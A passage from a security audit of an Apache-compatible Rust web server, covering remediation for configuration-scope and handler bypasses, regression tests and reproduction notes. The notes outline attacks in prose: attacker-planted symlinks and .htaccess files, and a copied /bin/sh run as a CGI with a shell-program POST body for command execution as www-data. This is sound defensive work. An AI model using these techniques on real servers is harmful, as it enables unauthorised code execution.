     pre-resolution grant plus the target grant).
   * headers/MIME: apply the stricter/ordered policy; do not silently drop
     lexical header or content policy.
2. **Evaluate `<Directory>`/`<DirectoryMatch>` rules against both path
   identities** when they differ, or evaluate the initial URL-mapped scope
   and the canonical target scope separately and merge them conjunctively.
   Do the same for every transform that produces an explicit target:
   `DirectoryIndex`, `ErrorDocument`, PATH_INFO CGI, FastCGI, rewrite
   filesystem targets, cache target scope and `--explain`.
3. **Extend access-file collection above the lexical mapping root.** When a
   mapping root contains a symlink, walk both the canonical target's
   ancestors and the lexical mapping root's ancestors. Apply an ancestor
   layer exactly when its `AllowOverride` policy applies to the lexical
   directory; if a layer cannot be bound to the target, fail closed rather
   than dropping it.
4. **Make `AllowOverride` deny, not merely replace, across path identities.**
   A lexical `<Directory> AllowOverride None` must suppress a canonical
   `<Directory> AllowOverride All` for the same request; when the mapped
   lexical policy is disabled the target layer walk must return no layers
   (or fail closed). `mapped_policy_dir()` must not keep the canonical
   override-enabled scope merely because the lexical scope's
   `override_policy.is_enabled()` is false.
5. **Do not let `evaluate_scope()` silently ignore a layer set that is not in
   the canonical ancestor list.** If the layer cannot be applied, either
   re-evaluate it against the proper lexical ancestor or return `500`.
6. Keep the pre-resolution grant check as a required gate, but make the
   post-resolution execution decision a conjunction with the initial scope.

## Remediation — additional findings

* **F61:** parse `<Location ~ regex>` as `LocationMatch`, and implement
  Apache's component-wise shell-glob semantics for `<Location>` wildcards
  (wildcards must not cross `/`). Reject unsupported Location forms at
  configuration load rather than treating them as literal prefixes.
* **F62:** treat a leading `^` exactly like `!` for `[^...]` class negation
  in `glob_match()` and `files_glob_to_regex()`; add differential cases for
  both `<Directory>` and `<Files>`.
* **F63:** bind the resolved `fs_path` into `expr::Context` and implement
  `REQUEST_FILENAME`, `SCRIPT_FILENAME` and the other documented Apache
  variables. Reject unimplemented variables/operators/functions at
  configuration load instead of silently evaluating false. Distinguish
  main-configuration file tests from the F45 `.htaccess` confinement.
* **F64:** model `SetHandler` as a separate override field with precedence
  over the extension `AddHandler` map; only a later `SetHandler` may replace
  it. Do not model it as a wildcard entry in the ordered extension table.
* **F65:** when `script_alias` is set, install `cgi-script` as the default
  handler only if no explicit effective handler is configured; honor a
  scoped `SetHandler default-handler`.
* **F66:** for directory targets, match `DirectoryMatch` against both the
  path and its trailing-slash form, matching Apache's directory-walk
  filename.
* **F67:** when `[PT]` is set, do not create a filesystem override for the
  substitution; pass it through normal URL mapping. Alternatively reject
  `[PT]` with absolute substitutions as unsupported rather than executing a
  host file.
* **F68:** clear `filesystem_override` whenever a later matching rule changes
  the URL or produces a new substitution, so only the final rewrite round's
  target is applied.
* **F69:** select handlers from the lexical request filename (Apache's
  `r->filename`) while keeping authorization/containment on the resolved
  target; or require both the lexical and canonical handler identities to
  agree before execution.

## Model / regression updates

Add an invariant such as:

```text
I61 — Resolved-target scope conjunction
For every request whose URL-mapped lexical path L differs from the opened
canonical target T:
  served/executed target scope == merge(scope(L), scope(T))
  Options permission bits used for handler selection ==
      options(L) AND options(T)
  a RemoveHandler / SetHandler none / handler denial in scope(L)
      survives scope(T)
  every <Directory>/<DirectoryMatch> rule that matched L is either
      preserved or causes a fail-closed error
  every applicable ancestor access-file layer of L is preserved
  AllowOverride(L) None => no access-file layer of T is read
No target reauthorization may replace these with scope(T) alone.
```

The F59 kernels remain valid for what they prove (explicit-target layers
belong to T and are consumed), but they are not sufficient: the obligation
must include the **configuration scope of the original URL mapping** and the
lexical ancestors above the mapping root, not only the target's own layers.
Extend `docs/verification-status.json` and `docs/config-semantics.md`
accordingly.

The additional findings need their own finite obligations:

```text
LocationMatch/globs:
  every Apache shell-glob or ~regex Location has a matcher with the same
  match set as Apache; wildcards never cross '/'
  [^...] and [!...] are both negated classes in Directory and Files globs

Expressions:
  every documented variable/operator accepted by the parser is either
  implemented with Apache semantics or rejected at configuration load
  an expression evaluation error is a configuration error, never false

Handler identity:
  SetHandler overrides AddHandler regardless of order/child scope
  ScriptAlias installs cgi-script only when no explicit handler overrides it
  handler selection uses the lexical request filename; execution uses the
  resolved target only after both identities agree

Rewrite state:
  [PT] never creates a filesystem override
  only the final rewrite round's target is applied; a later URL change
  clears any earlier filesystem override
```

### Regression tests to add

* Symlinked `DocumentRoot` + `<Directory root/uploads> Options -ExecCGI`,
  with **no** `.htaccess` and `AllowOverride None`; assert Apache and httpd-rs
  both `403`, and assert a `POST` body cannot execute.
* Same for a symlinked `Alias`, `AliasMatch` and single-file alias target.
* An attacker-created symlink **inside** an ordinary `DocumentRoot`
  (`uploads/link.cgi -> ../payload/sh.cgi`) with `<Directory uploads>
  Options -ExecCGI`; assert Apache `403` and httpd-rs does not execute.
* Ancestor `.htaccess` above the symlinked mapping root with
  `Options -ExecCGI`, `RemoveHandler .cgi`, and `SetHandler none`.
* `<Directory root/list> Options -Indexes`; assert both `403` and no listing.
* Lexical `<Directory link> AllowOverride None` plus canonical
  `<Directory real> AllowOverride All`, with an attacker `.htaccess`
  (`Options +ExecCGI`/`AddHandler`) and an executable upload; assert Apache
  serves source and httpd-rs does not execute (and a control with canonical
  `AllowOverride None` where both serve source).
* `DirectoryIndex index.cgi` and `ErrorDocument ... /admin/err.cgi` variants
  where the index/error target is in the protected directory.
* Cache-enabled `DirectoryIndex` target: assert a cached entry cannot serve
  the protected index and cannot bypass the execution gate.
* A control where the same `<Directory>`/`.htaccess` policy is removed,
  proving the differential is caused by the lost scope.
* The existing `F59ExplicitTargetAccessLayerTests` must be extended, not
  treated as complete; its child `.htaccess` cases pass while all of the
  above fail.
* Add Apache-differential replays for every F61-F69 shape: wildcard/regex
  Location deny and `Options -ExecCGI`; `[^a]` Directory and Files globs;
  missing `REQUEST_FILENAME`/`SCRIPT_FILENAME` expressions and absolute
  main-config `<If -f>`; SetHandler/AddHandler precedence; ScriptAlias
  handler override; DirectoryMatch trailing-slash deny; `[PT]` absolute
  substitution; sticky rewrite override followed by `[L]`; and non-CGI
  symlink URL to `.php`/`.cgi` target with a global AddHandler.

---

## Cross-cutting observations

* **This is not a Verus kernel bypass.** URI normalization, percent decoding,
  `openat2(RESOLVE_BENEATH)`, the path-under-base kernel and the inode binding
  all behave correctly. F60 is a scope-identity split above them; F61-F69 are
  matcher/expression/handler/rewrite-state semantics above them.
* **F61, F62, F63, F67 and F68 need no symlink, no upload and no race.** They
  are triggered by ordinary config + HTTP and execute a protected CGI or
  bypass a Location/expression deny. F64/F65 need only a handler-order or
  ScriptAlias configuration; F69 needs an in-root symlink.
* **F60's in-progress patch does not close the other classes.** The additional
  findings were verified against a pristine HEAD worktree, not against the
  concurrent F60 remediation.
* **The pre-resolution grant is why `Require` still works.** The initial
  scope is not dead code; it enforces authentication and access rules.
  Only the post-resolution execution/list policy is dropped when the target
  scope replaces it.
* **F59's regression suite gives a false sense of closure.** All five
  `F59ExplicitTargetAccessLayerTests` pass on this tree, yet the same
  deployment with a plain `<Directory>` rule, or with the hardening
  `.htaccess` one directory above the mapping root, executes.
* **Alias roots are affected too.** The same scope replacement is used for
  `Alias`/`AliasMatch`/single-file alias targets; the symlink can be the
  `DocumentRoot`, an alias target, or an intermediate component.
* **No unusual request bytes are needed.** The exploit is ordinary HTTP:
  a normal POST or GET to an existing path. No race, malformed request,
  cache state or local account is required for the pre-existing-script
  variants; the arbitrary-command variant additionally needs an ordinary
  executable-upload/plugin primitive.

---

## Reproduction notes

* All fixtures are under `/tmp/opencode/p10-*` and `/tmp/opencode/`
  (`locwild2`, `dirglobneg`, `ifvar4`, `seth4`, `sa_seth`, `dmslash`,
  `p11-pt`, `p11-sticky-*`, `p11-b-*`). Our repository source was not edited.
  During the pass a concurrent session left an in-progress F60 remediation in
  the main working tree (`git status` is dirty). Findings are against the
  pristine `HEAD ebfd8a7`, and final F61-F69 verification used the clean
  detached worktree `/tmp/opencode/httpd-rs-head` built at that commit
  (SHA-256 `ce9a53d905d9122675acde6fea446baec6cb9910573e62e40ae2a9d15aa1cfde`).
* Reproduction drivers used for the F60 report:
  `/tmp/opencode/p10_poc.py` (F60-A, alias and `.htaccess` controls),
  `/tmp/opencode/p10_rootdir.py` (root-level `<Directory>` variant),
  `/tmp/opencode/p10_intree2.py` (F60-E in-root symlink),
  `/tmp/opencode/p10_intree3.py` (F60-E pre-existing CGI target),
  `/tmp/opencode/p10_ancestor.py` (F60-B),
  `/tmp/opencode/p10matrix.py` (F60-C listing/`RemoveHandler`), and
  `/tmp/opencode/p10_override2.py` / `/tmp/opencode/p10_override3.py`
  (F60-D root-level and upload-directory `AllowOverride None`).
* F61-F69 fixtures and scripts are under `/tmp/opencode/locwild2`,
  `/tmp/opencode/dirglobneg`, `/tmp/opencode/ifvar*`, `/tmp/opencode/seth*`,
  `/tmp/opencode/sa_seth`, `/tmp/opencode/dmslash`, `/tmp/opencode/p11-pt`,
  `/tmp/opencode/p11-sticky-*` and `/tmp/opencode/p11-b-*`; Apache and
  PHP-FPM 8.4.27 were used as local oracles.
* The F60 results were captured with a `HEAD ebfd8a7` release build before the
  concurrent patch landed. The F61-F69 final verification used the clean
  worktree binary listed above; the main tree's current
  `target/release/httpd-rs` was rebuilt by the concurrent session and is not
  the binary used for the reported HEAD differentials.
* Apache 2.4.69 was started with private loopback configurations and only the
  modules needed for `<Directory>`, `Options`, `AddHandler`, CGI,
  `DirectoryIndex`, autoindex and `RemoveHandler`.
* The CGI proof uses a copy of `/bin/sh` as an executable `.cgi` file, and the
  POST body is the shell program. The output demonstrates the server running
  commands as `www-data`. A pre-existing administrative/upload CGI that the
  `<Directory>` policy disabled is executed in the same way without an upload.
* The control runs remove the `<Directory>` block or the ancestor `.htaccess`
  and show both servers return `200`; the `403` differential is therefore
  caused by the policy that httpd-rs loses, not by an Apache/httpd-rs
  configuration mismatch.
